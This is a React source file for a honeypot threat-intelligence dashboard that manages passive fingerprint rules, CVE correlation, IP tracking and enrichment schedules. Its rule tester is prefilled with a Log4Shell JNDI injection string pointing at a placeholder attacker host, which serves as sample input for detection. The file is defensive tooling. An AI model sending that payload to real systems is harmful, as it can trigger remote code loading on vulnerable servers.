"use client";

import { useCallback, useState } from "react";
import Link from "next/link";
import {
  AlertTriangle,
  CalendarClock,
  Database,
  Globe,
  Play,
  Plus,
  RefreshCw,
  Save,
  Shield,
  Trash2,
  Zap,
} from "lucide-react";
import { CveTab } from "@/components/threat-intel/cve-tab";
import { IpIntelTab } from "@/components/threat-intel/ip-intel-tab";
import { apiFetch } from "@/lib/api";
import {
  ATTACK_TYPE_LABELS,
  JOB_TYPES,
  MATCH_FIELDS,
  PATTERN_TYPES,
  SEVERITY_OPTIONS,
  type EnrichmentConfig,
  type EnrichmentRule,
  type EnrichmentSchedule,
  type EnrichmentStats,
} from "@/lib/enrichment-types";
import { useAsyncData } from "@/hooks/use-async-data";
import { useFormatDateTime } from "@/hooks/use-format-datetime";
import { notify } from "@/lib/toast";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { PageHeader } from "@/components/ui/page-header";
import { Spinner } from "@/components/ui/spinner";
import { Textarea } from "@/components/ui/textarea";
import { Table, TableWrap, TBody, Td, Th, THead, Tr } from "@/components/ui/data-table";
import { EmptyState } from "@/components/ui/empty-state";
import { cn } from "@/lib/utils";

type TabId = "overview" | "rules" | "cve" | "ips" | "schedules" | "settings";

const TABS: { id: TabId; label: string; icon: typeof Shield }[] = [
  { id: "overview", label: "Overview", icon: Shield },
  { id: "rules", label: "Fingerprint rules", icon: Zap },
  { id: "cve", label: "CVE database", icon: Database },
  { id: "ips", label: "Bad IPs", icon: Globe },
  { id: "schedules", label: "Schedules", icon: CalendarClock },
  { id: "settings", label: "Settings", icon: AlertTriangle },
];

const RANGES = [
  { value: "1h", label: "1 hour" },
  { value: "1d", label: "24 hours" },
  { value: "7d", label: "7 days" },
  { value: "30d", label: "30 days" },
];

function StatTile({ label, value, sub }: { label: string; value: string | number; sub?: string }) {
  return (
    <div className="rounded-xl border border-zinc-800 bg-zinc-900/50 p-4">
      <p className="text-xs font-medium uppercase tracking-wide text-zinc-500">{label}</p>
      <p className="mt-1 text-2xl font-semibold tabular-nums text-zinc-100">{value}</p>
      {sub ? <p className="mt-1 text-xs text-zinc-500">{sub}</p> : null}
    </div>
  );
}

export function ThreatIntelPanel() {
  const [tab, setTab] = useState<TabId>("overview");
  const [range, setRange] = useState("1d");

  const fetchStats = useCallback(
    () => apiFetch<EnrichmentStats>(`/enrichment/stats?range=${encodeURIComponent(range)}`),
    [range],
  );
  const { data: stats, loading: statsLoading, refetch: refetchStats } = useAsyncData(fetchStats);

  return (
    <div className="space-y-8">
      <PageHeader
        title="Threat intelligence"
        description="Passive fingerprinting and CVE correlation on ingested honeypot events. Event-driven enrichment runs on ingest and on schedule — alert-only, no blocking."
        actions={
          <Button type="button" variant="outline" size="sm" onClick={() => refetchStats()}>
            <RefreshCw className="mr-1.5 h-3.5 w-3.5" />
            Refresh
          </Button>
        }
      />

      <div className="flex flex-wrap gap-2 border-b border-zinc-800 pb-1">
        {TABS.map((t) => {
          const Icon = t.icon;
          return (
            <button
              key={t.id}
              type="button"
              onClick={() => setTab(t.id)}
              className={cn(
                "inline-flex items-center gap-2 rounded-lg px-3 py-2 text-sm font-medium transition-colors",
                tab === t.id
                  ? "bg-emerald-950/60 text-emerald-300 ring-1 ring-emerald-800/60"
                  : "text-zinc-400 hover:bg-zinc-900 hover:text-zinc-200",
              )}
            >
              <Icon className="h-4 w-4" />
              {t.label}
            </button>
          );
        })}
      </div>

      {tab === "overview" ? (
        <OverviewTab stats={stats ?? null} loading={statsLoading} range={range} onRangeChange={setRange} />
      ) : null}
      {tab === "rules" ? <RulesTab onChanged={refetchStats} /> : null}
      {tab === "cve" ? <CveTab /> : null}
      {tab === "ips" ? <IpIntelTab /> : null}
      {tab === "schedules" ? <SchedulesTab /> : null}
      {tab === "settings" ? <SettingsTab onChanged={refetchStats} /> : null}
    </div>
  );
}

function OverviewTab({
  stats,
  loading,
  range,
  onRangeChange,
}: {
  stats: EnrichmentStats | null;
  loading: boolean;
  range: string;
  onRangeChange: (v: string) => void;
}) {
  const { formatDateTime } = useFormatDateTime();
  return (
    <div className="space-y-6">
      <Card>
        <CardHeader className="flex flex-row flex-wrap items-center justify-between gap-4 pb-3">
          <div>
            <CardTitle className="text-base">Detection overview</CardTitle>
            <CardDescription>Aggregated enrichment matches across runtime and infra channels.</CardDescription>
          </div>
          <div className="flex items-center gap-2">
            <Label htmlFor="ti-range" className="sr-only">
              Time range
            </Label>
            <select
              id="ti-range"
              value={range}
              onChange={(e) => onRangeChange(e.target.value)}
              className="rounded-lg border border-zinc-700 bg-zinc-900 px-3 py-1.5 text-sm text-zinc-200"
            >
              {RANGES.map((r) => (
                <option key={r.value} value={r.value}>
                  {r.label}
                </option>
              ))}
            </select>
          </div>
        </CardHeader>
        <CardContent>
          {loading && !stats ? (
            <div className="flex justify-center py-12">
              <Spinner />
            </div>
          ) : stats ? (
            <div className="space-y-6">
              <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-4">
                <StatTile label="Matched events" value={stats.matched_events} sub={`of ${stats.total_events} total`} />
                <StatTile label="Match rate" value={`${stats.enrichment_rate}%`} sub="Passive detections" />
                <StatTile label="Active rules" value={stats.rules_enabled} sub={`${stats.rules_total} total`} />
                <StatTile label="CVE cache" value={stats.cve_cache_size} sub={`${stats.schedules_enabled} schedules on`} />
              </div>

              {!stats.config.enabled ? (
                <div className="rounded-lg border border-amber-900/50 bg-amber-950/20 px-4 py-3 text-sm text-amber-200">
                  Enrichment is disabled in settings. Events are stored but not fingerprinted.
                </div>
              ) : null}

              <div className="grid gap-6 lg:grid-cols-3">
                <BreakdownCard title="Attack types" items={stats.by_attack_type} labelFn={(k) => ATTACK_TYPE_LABELS[k] ?? k} />
                <BreakdownCard title="Tools" items={stats.by_tool} />
                <BreakdownCard title="CVE correlations" items={stats.by_cve} mono />
              </div>

              <Card className="border-zinc-800 bg-zinc-950/30">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Recent matches</CardTitle>
                </CardHeader>
                <CardContent className="p-0">
                  {stats.recent_matches.length === 0 ? (
                    <EmptyState icon={Shield} title="No matches yet" description="Deploy honeypots and wait for traffic, or test rules with sample text." />
                  ) : (
                    <TableWrap>
                      <Table>
                        <THead>
                          <Tr>
                            <Th>Time</Th>
                            <Th>Attack</Th>
                            <Th>Tool / CVE</Th>
                            <Th>Confidence</Th>
                            <Th></Th>
                          </Tr>
                        </THead>
                        <TBody>
                          {stats.recent_matches.map((m) => (
                            <Tr key={m.event_id}>
                              <Td className="text-xs text-zinc-500">{formatDateTime(m.received_at)}</Td>
                              <Td>
                                <div className="flex flex-wrap gap-1">
                                  {(m.attack_types.length ? m.attack_types : ["unknown"]).map((a) => (
                                    <Badge key={a} tone="warning">
                                      {ATTACK_TYPE_LABELS[a] ?? a}
                                    </Badge>
                                  ))}
                                </div>
                              </Td>
                              <Td className="text-xs font-mono text-zinc-400">
                                {[...m.tools, ...m.cve_ids].filter(Boolean).join(" · ") || "—"}
                              </Td>
                              <Td className="tabular-nums text-zinc-300">
                                {m.confidence != null ? `${Math.round(m.confidence * 100)}%` : "—"}
                              </Td>
                              <Td>
                                <Link
                                  href={`/events?pot_id=${m.pot_id}`}
                                  className="text-xs text-emerald-400 hover:text-emerald-300"
                                >
                                  View
                                </Link>
                              </Td>
                            </Tr>
                          ))}
                        </TBody>
                      </Table>
                    </TableWrap>
                  )}
                </CardContent>
              </Card>
            </div>
          ) : null}
        </CardContent>
      </Card>
    </div>
  );
}

function BreakdownCard({
  title,
  items,
  labelFn,
  mono,
}: {
  title: string;
  items: { key: string; count: number }[];
  labelFn?: (k: string) => string;
  mono?: boolean;
}) {
  const max = Math.max(...items.map((i) => i.count), 1);
  return (
    <Card>
      <CardHeader className="pb-2">
        <CardTitle className="text-sm">{title}</CardTitle>
      </CardHeader>
      <CardContent className="space-y-2">
        {items.length === 0 ? (
          <p className="text-xs text-zinc-500">No data in range</p>
        ) : (
          items.slice(0, 8).map((item) => (
            <div key={item.key} className="space-y-1">
              <div className="flex justify-between text-xs">
                <span className={cn("truncate text-zinc-300", mono && "font-mono")}>
                  {labelFn ? labelFn(item.key) : item.key}
                </span>
                <span className="tabular-nums text-zinc-500">{item.count}</span>
              </div>
              <div className="h-1.5 overflow-hidden rounded-full bg-zinc-800">
                <div
                  className="h-full rounded-full bg-emerald-600/80"
                  style={{ width: `${Math.round((item.count / max) * 100)}%` }}
                />
              </div>
            </div>
          ))
        )}
      </CardContent>
    </Card>
  );
}

function RulesTab({ onChanged }: { onChanged: () => void }) {
  const fetchRules = useCallback(() => apiFetch<EnrichmentRule[]>("/enrichment/rules"), []);
  const { data: rules, loading, refetch } = useAsyncData(fetchRules);
  const [editing, setEditing] = useState<Partial<EnrichmentRule> | null>(null);
  const [testText, setTestText] = useState("${jndi:ldap://evil.example/a}");
  const [testResult, setTestResult] = useState<string | null>(null);
  const [busy, setBusy] = useState(false);

  const list = rules ?? [];

  async function saveRule() {
    if (!editing?.name?.trim() || !editing.pattern?.trim()) {
      notify.error("Name and pattern are required");
      return;
    }
    setBusy(true);
    try {
      const body = {
        name: editing.name,
        description: editing.description ?? null,
        pattern: editing.pattern,
        pattern_type: editing.pattern_type ?? "regex",
        match_field: editing.match_field ?? "both",
        attack_type: editing.attack_type ?? null,
        tool: editing.tool ?? null,
        technique: editing.technique ?? null,
        cve_ids: editing.cve_ids ?? [],
        severity: editing.severity ?? null,
        enabled: editing.enabled ?? true,
        priority: editing.priority ?? 50,
      };
      if (editing.id) {
        await apiFetch(`/enrichment/rules/${editing.id}`, { method: "PATCH", json: body });
        notify.success("Rule updated");
      } else {
        await apiFetch("/enrichment/rules", { method: "POST", json: body });
        notify.success("Rule created");
      }
      setEditing(null);
      refetch();
      onChanged();
    } catch (e) {
      notify.apiError(e);
    } finally {
      setBusy(false);
    }
  }

  async function toggleRule(rule: EnrichmentRule) {
    try {
      await apiFetch(`/enrichment/rules/${rule.id}`, { method: "PATCH", json: { enabled: !rule.enabled } });
      refetch();
      onChanged();
    } catch (e) {
      notify.apiError(e);
    }
  }

  async function deleteRule(rule: EnrichmentRule) {
    if (rule.is_builtin) {
      notify.error("Built-in rules cannot be deleted");
      return;
    }
    if (!confirm(`Delete rule "${rule.name}"?`)) return;
    try {
      await apiFetch(`/enrichment/rules/${rule.id}`, { method: "DELETE" });
      notify.success("Rule deleted");
      refetch();
      onChanged();
    } catch (e) {
      notify.apiError(e);
    }
  }

  async function runTest() {
    try {
      const res = await apiFetch<{ matched: boolean; matches: { rule_name: string; attack_type?: string }[] }>(
        "/enrichment/rules/test",
        { method: "POST", json: { sample_text: testText } },
      );
      setTestResult(
        res.matched
          ? `Matched ${res.matches.length} rule(s): ${res.matches.map((m) => m.rule_name).join(", ")}`
          : "No rules matched",
      );
    } catch (e) {
      notify.apiError(e);
    }
  }

  return (
    <div className="grid gap-6 lg:grid-cols-[1fr_380px]">
      <Card>
        <CardHeader className="flex flex-row items-center justify-between gap-4">
          <div>
            <CardTitle className="text-base">Fingerprint rules</CardTitle>
            <CardDescription>Regex and pattern rules run passively against raw logs and payloads.</CardDescription>
          </div>
          <Button
            type="button"
            size="sm"
            onClick={() =>
              setEditing({
                name: "",
                pattern: "",
                pattern_type: "regex",
                match_field: "both",
                enabled: true,
                priority: 50,
                cve_ids: [],
              })
            }
          >
            <Plus className="mr-1.5 h-3.5 w-3.5" />
            Add rule
          </Button>
        </CardHeader>
        <CardContent>
          {loading && !rules ? (
            <Spinner />
          ) : list.length === 0 ? (
            <EmptyState icon={Zap} title="No rules" description="Built-in rules seed on first bootstrap." />
          ) : (
            <TableWrap>
              <Table>
                <THead>
                  <Tr>
                    <Th>Name</Th>
                    <Th>Attack</Th>
                    <Th>Priority</Th>
                    <Th>Status</Th>
                    <Th></Th>
                  </Tr>
                </THead>
                <TBody>
                  {list.map((rule) => (
                    <Tr key={rule.id}>
                      <Td>
                        <div className="font-medium text-zinc-200">{rule.name}</div>
                        {rule.is_builtin ? (
                          <Badge tone="info" className="mt-1">
                            Built-in
                          </Badge>
                        ) : null}
                      </Td>
                      <Td className="text-xs text-zinc-400">
                        {rule.attack_type ? ATTACK_TYPE_LABELS[rule.attack_type] ?? rule.attack_type : "—"}
                        {rule.tool ? ` · ${rule.tool}` : ""}
                      </Td>
                      <Td className="tabular-nums">{rule.priority}</Td>
                      <Td>
                        <Badge tone={rule.enabled ? "success" : "default"}>{rule.enabled ? "On" : "Off"}</Badge>
                      </Td>
                      <Td>
                        <div className="flex justify-end gap-1">
                          <Button type="button" variant="ghost" size="sm" onClick={() => setEditing(rule)}>
                            Edit
                          </Button>
                          <Button type="button" variant="ghost" size="sm" onClick={() => toggleRule(rule)}>
                            {rule.enabled ? "Disable" : "Enable"}
                          </Button>
                          {!rule.is_builtin ? (
                            <Button type="button" variant="ghost" size="sm" onClick={() => deleteRule(rule)}>
                              <Trash2 className="h-3.5 w-3.5 text-red-400" />
                            </Button>
                          ) : null}
                        </div>
                      </Td>
                    </Tr>
                  ))}
                </TBody>
              </Table>
            </TableWrap>
          )}
        </CardContent>
      </Card>

      <div className="space-y-6">
        {editing ? (
          <Card>
            <CardHeader>
              <CardTitle className="text-base">{editing.id ? "Edit rule" : "New rule"}</CardTitle>
            </CardHeader>
            <CardContent className="space-y-3">
              <div>
                <Label>Name</Label>
                <Input value={editing.name ?? ""} onChange={(e) => setEditing({ ...editing, name: e.target.value })} />
              </div>
              <div>
                <Label>Pattern</Label>
                <Textarea
                  className="font-mono text-xs min-h-[80px]"
                  value={editing.pattern ?? ""}
                  onChange={(e) => setEditing({ ...editing, pattern: e.target.value })}
                />
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label>Pattern type</Label>
                  <select
                    className="mt-1 w-full rounded-lg border border-zinc-700 bg-zinc-900 px-2 py-1.5 text-sm"
                    value={editing.pattern_type ?? "regex"}
                    onChange={(e) =>
                      setEditing({ ...editing, pattern_type: e.target.value as EnrichmentRule["pattern_type"] })
                    }
                  >
                    {PATTERN_TYPES.map((p) => (
                      <option key={p.value} value={p.value}>
                        {p.label}
                      </option>
                    ))}
                  </select>
                </div>
                <div>
                  <Label>Match field</Label>
                  <select
                    className="mt-1 w-full rounded-lg border border-zinc-700 bg-zinc-900 px-2 py-1.5 text-sm"
                    value={editing.match_field ?? "both"}
                    onChange={(e) =>
                      setEditing({ ...editing, match_field: e.target.value as EnrichmentRule["match_field"] })
                    }
                  >
                    {MATCH_FIELDS.map((p) => (
                      <option key={p.value} value={p.value}>
                        {p.label}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label>Attack type</Label>
                  <Input
                    value={editing.attack_type ?? ""}
                    onChange={(e) => setEditing({ ...editing, attack_type: e.target.value || null })}
                    placeholder="e.g. rce_probe"
                  />
                </div>
                <div>
                  <Label>Tool</Label>
                  <Input
                    value={editing.tool ?? ""}
                    onChange={(e) => setEditing({ ...editing, tool: e.target.value || null })}
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div>
                  <Label>MITRE technique</Label>
                  <Input
                    value={editing.technique ?? ""}
                    onChange={(e) => setEditing({ ...editing, technique: e.target.value || null })}
                    placeholder="T1190"
                  />
                </div>
                <div>
                  <Label>Severity boost</Label>
                  <select
                    className="mt-1 w-full rounded-lg border border-zinc-700 bg-zinc-900 px-2 py-1.5 text-sm"
                    value={editing.severity ?? ""}
                    onChange={(e) => setEditing({ ...editing, severity: e.target.value || null })}
                  >
                    <option value="">None</option>
                    {SEVERITY_OPTIONS.map((s) => (
                      <option key={s} value={s}>
                        {s}
                      </option>
                    ))}
                  </select>
                </div>
              </div>
              <div>
                <Label>CVE IDs (comma-separated)</Label>
                <Input
                  value={(editing.cve_ids ?? []).join(", ")}
                  onChange={(e) =>
                    setEditing({
                      ...editing,
                      cve_ids: e.target.value
                        .split(",")
                        .map((s) => s.trim())
                        .filter(Boolean),
                    })
                  }
                />
              </div>
              <div className="flex gap-2 pt-2">
                <Button type="button" size="sm" disabled={busy} onClick={saveRule}>
                  <Save className="mr-1.5 h-3.5 w-3.5" />
                  Save
                </Button>
                <Button type="button" variant="outline" size="sm" onClick={() => setEditing(null)}>
                  Cancel
                </Button>
              </div>
            </CardContent>
          </Card>
        ) : null}

        <Card>
          <CardHeader>
            <CardTitle className="text-base">Rule tester</CardTitle>
            <CardDescription>Paste sample log text — no data leaves your control plane except this API call.</CardDescription>
          </CardHeader>
          <CardContent className="space-y-3">
            <Textarea
              className="font-mono text-xs min-h-[100px]"
              value={testText}
              onChange={(e) => setTestText(e.target.value)}
            />
            <Button type="button" size="sm" variant="outline" onClick={runTest}>
              Test against active rules
            </Button>
            {testResult ? <p className="text-xs text-zinc-400">{testResult}</p> : null}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

function SchedulesTab() {
  const { formatDateTime } = useFormatDateTime();
  const fetchSchedules = useCallback(() => apiFetch<EnrichmentSchedule[]>("/enrichment/schedules"), []);
  const { data: schedules, loading, refetch } = useAsyncData(fetchSchedules);
  const [draft, setDraft] = useState<Partial<EnrichmentSchedule> | null>(null);
  const [busy, setBusy] = useState(false);

  async function saveSchedule() {
    if (!draft?.name?.trim()) {
      notify.error("Name is required");
      return;
    }
    setBusy(true);
    try {
      const body = {
        name: draft.name,
        job_type: draft.job_type ?? "batch_reenrich",
        interval_hours: draft.interval_hours ?? 24,
        enabled: draft.enabled ?? true,
        config: draft.config ?? {},
      };
      if (draft.id) {
        await apiFetch(`/enrichment/schedules/${draft.id}`, { method: "PATCH", json: body });
      } else {
        await apiFetch("/enrichment/schedules", { method: "POST", json: body });
      }
      notify.success("Schedule saved");
      setDraft(null);
      refetch();
    } catch (e) {
      notify.apiError(e);
    } finally {
      setBusy(false);
    }
  }

  async function runNow(id: string) {
    try {
      const res = await apiFetch<{ message: string }>(`/enrichment/schedules/${id}/run`, { method: "POST" });
      notify.success(res.message || "Schedule ran");
      refetch();
    } catch (e) {
      notify.apiError(e);
    }
  }

  async function deleteSched(id: string) {
    if (!confirm("Delete this schedule?")) return;
    try {
      await apiFetch(`/enrichment/schedules/${id}`, { method: "DELETE" });
      refetch();
    } catch (e) {
      notify.apiError(e);
    }
  }

  const list = schedules ?? [];

  return (
    <div className="grid gap-6 lg:grid-cols-[1fr_360px]">
      <Card>
        <CardHeader className="flex flex-row items-center justify-between">
          <div>
            <CardTitle className="text-base">Enrichment schedules</CardTitle>
            <CardDescription>Automated CVE sync and batch re-enrichment of recent events.</CardDescription>
          </div>
          <Button
            type="button"
            size="sm"
            onClick={() =>
              setDraft({
                name: "",
                job_type: "batch_reenrich",
                interval_hours: 24,
                enabled: true,
                config: { lookback_hours: 24, limit: 200 },
              })
            }
          >
            <Plus className="mr-1.5 h-3.5 w-3.5" />
            Add
          </Button>
        </CardHeader>
        <CardContent>
          {loading && !schedules ? (
            <Spinner />
          ) : (
            <TableWrap>
              <Table>
                <THead>
                  <Tr>
                    <Th>Name</Th>
                    <Th>Job</Th>
                    <Th>Interval</Th>
                    <Th>Next run</Th>
                    <Th>Last</Th>
                    <Th></Th>
                  </Tr>
                </THead>
                <TBody>
                  {list.map((s) => (
                    <Tr key={s.id}>
                      <Td className="font-medium text-zinc-200">{s.name}</Td>
                      <Td className="text-xs">{JOB_TYPES.find((j) => j.value === s.job_type)?.label ?? s.job_type}</Td>
                      <Td>{s.interval_hours}h</Td>
                      <Td className="text-xs text-zinc-500">
                        {s.next_run_at ? formatDateTime(s.next_run_at) : "—"}
                      </Td>
                      <Td className="text-xs">
                        {s.last_status ? (
                          <Badge tone={s.last_status === "completed" ? "success" : "danger"}>{s.last_status}</Badge>
                        ) : (
                          "—"
                        )}
                      </Td>
                      <Td>
                        <div className="flex justify-end gap-1">
                          <Button type="button" variant="ghost" size="sm" onClick={() => runNow(s.id)}>
                            <Play className="h-3.5 w-3.5" />
                          </Button>
                          <Button type="button" variant="ghost" size="sm" onClick={() => setDraft(s)}>
                            Edit
                          </Button>
                          <Button type="button" variant="ghost" size="sm" onClick={() => deleteSched(s.id)}>
                            <Trash2 className="h-3.5 w-3.5 text-red-400" />
                          </Button>
                        </div>
                      </Td>
                    </Tr>
                  ))}
                </TBody>
              </Table>
            </TableWrap>
          )}
        </CardContent>
      </Card>

      {draft ? (
        <Card>
          <CardHeader>
            <CardTitle className="text-base">{draft.id ? "Edit schedule" : "New schedule"}</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div>
              <Label>Name</Label>
              <Input value={draft.name ?? ""} onChange={(e) => setDraft({ ...draft, name: e.target.value })} />
            </div>
            <div>
              <Label>Job type</Label>
              <select
                className="mt-1 w-full rounded-lg border border-zinc-700 bg-zinc-900 px-2 py-1.5 text-sm"
                value={draft.job_type ?? "batch_reenrich"}
                onChange={(e) =>
                  setDraft({ ...draft, job_type: e.target.value as EnrichmentSchedule["job_type"] })
                }
              >
                {JOB_TYPES.map((j) => (
                  <option key={j.value} value={j.value}>
                    {j.label}
                  </option>
                ))}
              </select>
            </div>
            <div>
              <Label>Interval (hours)</Label>
              <Input
                type="number"
                min={1}
                value={draft.interval_hours ?? 24}
                onChange={(e) => setDraft({ ...draft, interval_hours: Number(e.target.value) })}
              />
            </div>
            {draft.job_type === "batch_reenrich" ? (
              <>
                <div>
                  <Label>Lookback hours</Label>
                  <Input
                    type="number"
                    min={1}
                    value={Number((draft.config as Record<string, unknown>)?.lookback_hours ?? 24)}
                    onChange={(e) =>
                      setDraft({
                        ...draft,
                        config: { ...(draft.config ?? {}), lookback_hours: Number(e.target.value) },
                      })
                    }
                  />
                </div>
                <div>
                  <Label>Event limit</Label>
                  <Input
                    type="number"
                    min={1}
                    value={Number((draft.config as Record<string, unknown>)?.limit ?? 200)}
                    onChange={(e) =>
                      setDraft({
                        ...draft,
                        config: { ...(draft.config ?? {}), limit: Number(e.target.value) },
                      })
                    }
                  />
                </div>
              </>
            ) : draft.job_type === "ip_scan" ? (
              <>
                <div>
                  <Label>Lookback hours</Label>
                  <Input
                    type="number"
                    min={1}
                    value={Number((draft.config as Record<string, unknown>)?.lookback_hours ?? 168)}
                    onChange={(e) =>
                      setDraft({
                        ...draft,
                        config: { ...(draft.config ?? {}), lookback_hours: Number(e.target.value) },
                      })
                    }
                  />
                </div>
                <div>
                  <Label>Event limit</Label>
                  <Input
                    type="number"
                    min={1}
                    value={Number((draft.config as Record<string, unknown>)?.limit ?? 500)}
                    onChange={(e) =>
                      setDraft({
                        ...draft,
                        config: { ...(draft.config ?? {}), limit: Number(e.target.value) },
                      })
                    }
                  />
                </div>
              </>
            ) : (
              <label className="flex items-center gap-2 text-sm text-zinc-300">
                <input
                  type="checkbox"
                  checked={Boolean((draft.config as Record<string, unknown>)?.fetch_remote ?? true)}
                  onChange={(e) =>
                    setDraft({
                      ...draft,
                      config: { ...(draft.config ?? {}), fetch_remote: e.target.checked },
                    })
                  }
                />
                Fetch remote OSV metadata
              </label>
            )}
            <label className="flex items-center gap-2 text-sm text-zinc-300">
              <input
                type="checkbox"
                checked={draft.enabled ?? true}
                onChange={(e) => setDraft({ ...draft, enabled: e.target.checked })}
              />
              Enabled
            </label>
            <div className="flex gap-2 pt-2">
              <Button type="button" size="sm" disabled={busy} onClick={saveSchedule}>
                Save
              </Button>
              <Button type="button" variant="outline" size="sm" onClick={() => setDraft(null)}>
                Cancel
              </Button>
            </div>
          </CardContent>
        </Card>
      ) : null}
    </div>
  );
}

function SettingsTab({ onChanged }: { onChanged: () => void }) {
  const fetchConfig = useCallback(() => apiFetch<EnrichmentConfig>("/enrichment/config"), []);
  const { data: config, loading, refetch } = useAsyncData(fetchConfig);
  const [draft, setDraft] = useState<EnrichmentConfig | null>(null);
  const [reprocessBusy, setReprocessBusy] = useState(false);

  const current = draft ?? config;

  async function save() {
    if (!current) return;
    try {
      await apiFetch("/enrichment/config", { method: "PUT", json: current });
      notify.success("Enrichment settings saved");
      setDraft(null);
      refetch();
      onChanged();
    } catch (e) {
      notify.apiError(e);
    }
  }

  async function reprocess() {
    setReprocessBusy(true);
    try {
      const res = await apiFetch<{ processed: number; matched: number }>("/enrichment/reprocess", {
        method: "POST",
        json: { lookback_hours: 24, limit: 200, force: false },
      });
      notify.success(`Reprocessed ${res.processed} events, ${res.matched} matches`);
      onChanged();
    } catch (e) {
      notify.apiError(e);
    } finally {
      setReprocessBusy(false);
    }
  }

  if (loading && !current) return <Spinner />;

  return (
    <div className="grid gap-6 lg:grid-cols-2">
      <Card>
        <CardHeader>
          <CardTitle className="text-base">Enrichment engine</CardTitle>
          <CardDescription>Global passive monitoring configuration. Changes apply immediately on save.</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          {current ? (
            <>
              {(
                [
                  ["enabled", "Enable enrichment pipeline"],
                  ["auto_enrich_on_ingest", "Auto-enrich on event ingest"],
                  ["cve_lookup_enabled", "Attach CVE details from cache"],
                  ["elevate_severity", "Elevate event severity on high-confidence matches"],
                  ["ip_tracking_enabled", "Track public source IPs from events"],
                  ["ip_lookup_enabled", "Geo lookup for new IPs (ip-api.com)"],
                ] as const
              ).map(([key, label]) => (
                <label key={key} className="flex items-center justify-between gap-4 rounded-lg border border-zinc-800 px-3 py-2">
                  <span className="text-sm text-zinc-300">{label}</span>
                  <input
                    type="checkbox"
                    checked={Boolean(current[key])}
                    onChange={(e) => setDraft({ ...(draft ?? current), [key]: e.target.checked })}
                  />
                </label>
              ))}
              <div>
                <Label>Minimum confidence (0–1)</Label>
                <Input
                  type="number"
                  step={0.05}
                  min={0}
                  max={1}
                  value={current.min_confidence}
                  onChange={(e) =>
                    setDraft({ ...(draft ?? current), min_confidence: Number(e.target.value) })
                  }
                />
              </div>
              <div>
                <Label>Max events per batch</Label>
                <Input
                  type="number"
                  min={1}
                  max={1000}
                  value={current.max_events_per_batch}
                  onChange={(e) =>
                    setDraft({ ...(draft ?? current), max_events_per_batch: Number(e.target.value) })
                  }
                />
              </div>
              <div>
                <Label>Enrich channels (comma-separated)</Label>
                <Input
                  value={(current.enrich_channels ?? []).join(", ")}
                  onChange={(e) =>
                    setDraft({
                      ...(draft ?? current),
                      enrich_channels: e.target.value
                        .split(",")
                        .map((s) => s.trim())
                        .filter(Boolean),
                    })
                  }
                />
              </div>
              <div>
                <Label>IP lookup cooldown (hours)</Label>
                <Input
                  type="number"
                  min={1}
                  max={168}
                  value={current.ip_lookup_cooldown_hours}
                  onChange={(e) =>
                    setDraft({ ...(draft ?? current), ip_lookup_cooldown_hours: Number(e.target.value) })
                  }
                />
              </div>
              <div>
                <Label>AbuseIPDB API key (optional)</Label>
                <Input
                  type="password"
                  value={current.abuseipdb_api_key ?? ""}
                  onChange={(e) => setDraft({ ...(draft ?? current), abuseipdb_api_key: e.target.value })}
                  placeholder="For abuse confidence scores"
                />
                <p className="mt-1 text-xs text-zinc-500">Stored server-side. Leave empty to use geo lookup only.</p>
              </div>
              <div className="flex gap-2 pt-2">
                <Button type="button" size="sm" onClick={save} disabled={!draft}>
                  <Save className="mr-1.5 h-3.5 w-3.5" />
                  Save settings
                </Button>
                {draft ? (
                  <Button type="button" variant="outline" size="sm" onClick={() => setDraft(null)}>
                    Discard
                  </Button>
                ) : null}
              </div>
            </>
          ) : null}
        </CardContent>
      </Card>

      <Card>
        <CardHeader>
          <CardTitle className="text-base">Manual operations</CardTitle>
          <CardDescription>One-off batch jobs — audited in the control-plane log.</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <Button type="button" variant="outline" disabled={reprocessBusy} onClick={reprocess}>
            {reprocessBusy ? <Spinner className="h-3.5 w-3.5" /> : <RefreshCw className="mr-1.5 h-3.5 w-3.5" />}
            Re-enrich last 24h of events
          </Button>
          <p className="text-xs text-zinc-500">
            Runs fingerprint rules against recent runtime events that have not been matched yet. Does not block or modify
            honeypot containers.
          </p>
        </CardContent>
      </Card>
    </div>
  );
}
